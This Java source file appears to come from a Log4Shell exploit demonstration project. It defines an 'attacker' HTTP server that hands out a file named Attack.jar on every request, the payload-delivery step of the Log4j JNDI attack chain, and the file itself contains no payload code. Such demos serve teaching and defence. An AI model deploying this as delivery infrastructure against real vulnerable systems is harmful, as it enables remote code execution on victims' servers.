package de.apwolf.log4shell.attacker;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpServer;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.nio.file.Files;

/**
 * This is a simple file hosting webserver - it just returns a Jar on every request
 */
public class AttackerWebServer {

    private static final Logger LOGGER = LogManager.getLogger();
    private static final int PORT = 8081;

    // The Jar this service provides - must be stored in the resources/ folder, no subfolder please
    private static final String ATTACK_JAR = "Attack.jar";

    public void start() throws IOException {
        HttpServer server = HttpServer.create(new InetSocketAddress(PORT), 0);
        server.createContext("/", this::handle); // just always return the Jar
        server.start();
        LOGGER.info("Started Attacker HTTP Server on localhost:" + PORT);
    }

    private void handle(HttpExchange t) {
        try {
            LOGGER.info("HTTP call " + t.getRequestMethod() + " " + t.getRequestURI());
            byte[] payload = Files.readAllBytes(new File(AttackerWebServer.class.getClassLoader().getResource(ATTACK_JAR).toURI()).toPath());
            t.getResponseHeaders().add("Content-Disposition", "attachment; filename=" + ATTACK_JAR); // not actually needed but nicer for humans
            t.sendResponseHeaders(200, payload.length);
            OutputStream os = t.getResponseBody();
            os.write(payload);
            os.close();
        } catch (Exception e) {
            LOGGER.error(e);
            throw new IllegalStateException(e);
        }
    }

}
